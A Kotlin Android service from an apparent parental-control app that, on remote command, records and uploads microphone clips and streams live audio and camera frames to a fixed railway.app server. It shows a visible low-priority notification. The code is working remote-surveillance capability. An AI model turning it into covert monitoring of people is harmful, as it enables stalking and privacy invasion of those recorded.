package com.parentcontrol.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okio.ByteString.Companion.toByteString
import java.io.File

class MonitoringService : Service() {

    private var audioRecord: AudioRecord? = null
    private val CHANNEL_ID = "monitoring_channel"
    private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/upload"
    private val WS_URL = "wss://overflowing-perception-production-17b2.up.railway.app"
    private var isLive = false
    private var isCameraLive = false
    private var wsAudio: okhttp3.WebSocket? = null
    private var wsCamera: okhttp3.WebSocket? = null
    private val SAMPLE_RATE = 16000
    private val BUFFER_SIZE = AudioRecord.getMinBufferSize(
        SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
    ) * 4

    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var currentCameraIndex = 0

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.getStringExtra("action")) {
            "start_audio" -> startAudioRecording()
            "stop_audio" -> {}
            "start_live" -> startLiveStream()
            "stop_live" -> stopLiveStream()
            "start_camera" -> startCameraStream()
            "stop_camera" -> stopCameraStream()
            "switch_camera" -> {
                stopCameraStream()
                currentCameraIndex = if (currentCameraIndex == 0) 1 else 0
                startCameraStream()
            }
        }
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Child Monitor Active")
            .setContentText("Monitoring is running — parent can see activity")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Monitoring Service", NotificationManager.IMPORTANCE_LOW)
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    // --- AUDIO RECORDING ---
    private fun startAudioRecording() {
        try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp4")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            Handler(mainLooper).postDelayed({
                recorder.stop()
                recorder.release()
                uploadFile(file)
            }, 30000)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun uploadFile(file: File) {
        Thread {
            try {
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
                    .build()
                OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) { e.printStackTrace() }
        }.start()
    }

    // --- LIVE AUDIO ---
    private fun startLiveStream() {
        isLive = true
        wsAudio = OkHttpClient().newWebSocket(
            Request.Builder().url("$WS_URL?type=child").build(),
            object : WebSocketListener() {
                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                    streamMicToWebSocket(webSocket)
                }
                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
                    isLive = false
                }
            }
        )
    }

    private fun streamMicToWebSocket(webSocket: okhttp3.WebSocket) {
        Thread {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC, SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, BUFFER_SIZE
            )
            audioRecord?.startRecording()
            val buffer = ByteArray(BUFFER_SIZE)
            while (isLive) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) webSocket.send(buffer.copyOf(read).toByteString())
            }
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        }.start()
    }

    private fun stopLiveStream() {
        isLive = false
        wsAudio?.close(1000, "Stop")
        wsAudio = null
    }

    // --- CAMERA STREAM ---
    private fun startCameraStream() {
        isCameraLive = true
        cameraThread = HandlerThread("CameraThread").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)

        wsCamera = OkHttpClient().newWebSocket(
            Request.Builder().url("$WS_URL?type=camera").build(),
            object : WebSocketListener() {
                override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                    openCamera(webSocket)
                }
                override fun onFailure(webSocket: okhttp3.WebSocket, t: Throwable, response: Response?) {
                    isCameraLive = false
                }
            }
        )
    }

    private fun openCamera(webSocket: okhttp3.WebSocket) {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraList = cameraManager.cameraIdList
        val cameraId = cameraList[currentCameraIndex.coerceAtMost(cameraList.size - 1)]

        // 320x240 = fast stream!
        imageReader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2)
        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)
            image.close()
            if (isCameraLive) webSocket.send(bytes.toByteString())
        }, cameraHandler)

        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                val surface = imageReader!!.surface
                camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                            addTarget(surface)
                        }.build()
                        session.setRepeatingRequest(request, null, cameraHandler)
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {}
                }, cameraHandler)
            }
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
        }, cameraHandler)
    }

    private fun stopCameraStream() {
        isCameraLive = false
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        cameraThread?.quitSafely()
        cameraThread = null
        wsCamera?.close(1000, "Stop")
        wsCamera = null
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
